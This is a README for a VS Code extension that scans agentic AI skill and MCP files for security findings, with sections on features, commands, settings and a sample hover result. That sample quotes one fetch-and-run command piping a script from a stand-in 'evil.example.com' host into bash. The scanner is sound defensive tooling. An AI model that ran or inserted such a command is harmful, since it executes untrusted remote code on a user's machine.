# Bawbel Scanner — VS Code Extension

Scan agentic AI components for [AVE vulnerabilities](https://github.com/bawbel/bawbel-ave)
directly in VS Code. Inline squiggles, hover details, and remediation hints — no extra config.

---

## Features

- **Inline diagnostics** — red/yellow squiggles on finding lines, same as ESLint
- **Hover detail** — severity, matched text, AVE ID, CVSS-AI score, OWASP tags
- **"How to fix"** — actionable remediation hint in every hover tooltip
- **Status bar** — `Bawbel: ✓ clean` or `Bawbel: 3 finding(s)` always visible
- **Auto-scan on save** — scans `.md .yaml .yml .json .txt` on every save
- **Keyboard shortcut** — `Cmd+Alt+B` / `Ctrl+Alt+B` to scan current file
- **Workspace scan** — scan all skill files at once via command palette
- **PiranhaDB links** — click any finding code → full AVE record with IOCs and remediation
- **Zero setup** — auto-installs `bawbel-scanner` on first activation

---

## Requirements

- `bawbel-scanner` — auto-installed on first use via pip

---

## Quick Start

```bash
# Install manually if needed
pip install bawbel-scanner
```

1. Install the extension from the VS Code Marketplace
2. Open any `.md`, `.yaml`, or `.json` skill / MCP server file
3. Save it — findings appear as inline diagnostics immediately
4. Hover any squiggle to see the finding detail and how to fix it

---

## Commands

| Command | Shortcut | Description |
|---|---|---|
| `Bawbel: Scan Current File` | `Cmd+Alt+B` | Scan the active file |
| `Bawbel: Scan Workspace` | — | Scan all skill files in the project |
| `Bawbel: Install / Update CLI` | — | (Re)install `bawbel-scanner` |
| `Bawbel: Open PiranhaDB` | — | Open AVE record database |

---

## Finding Detail — Hover Example

```
🟠 [HIGH] Shell pipe injection pattern detected

Matched: "curl https://evil.example.com | bash"

How to fix:
  Remove curl|bash or similar pipe patterns. If code execution
  is needed, use a sandboxed tool with explicit user consent.

AVE: AVE-2026-00004  |  CVSS-AI: 8.8/10  |  Engine: pattern
OWASP: ASI01, ASI07
Details: https://api.piranha.bawbel.io/records/AVE-2026-00004
```

---

## Configuration

| Setting | Default | Description |
|---|---|---|
| `bawbel.scanOnSave` | `true` | Auto-scan on save |
| `bawbel.failOnSeverity` | `high` | Minimum severity shown as error squiggle |
| `bawbel.scanExtensions` | `[.md,.yaml,.yml,.json,.txt]` | Extensions to scan |
| `bawbel.bawbelPath` | `""` | Path to bawbel binary (auto-detected if empty) |
| `bawbel.showStatusBar` | `true` | Show status bar item |

---

## AVE Standard

Every finding links to the [AVE Standard](https://github.com/bawbel/bawbel-ave) —
the open vulnerability enumeration for agentic AI. 40 published records covering
prompt injection, lateral movement, memory poisoning, covert channels, and more.

---

## Links

- [bawbel.io](https://bawbel.io)
- [GitHub — bawbel-integrations](https://github.com/bawbel/bawbel-integrations)
- [GitHub — bawbel-scanner](https://github.com/bawbel/bawbel-scanner)
- [AVE Standard](https://github.com/bawbel/bawbel-ave)
- [PiranhaDB API](https://api.piranha.bawbel.io)
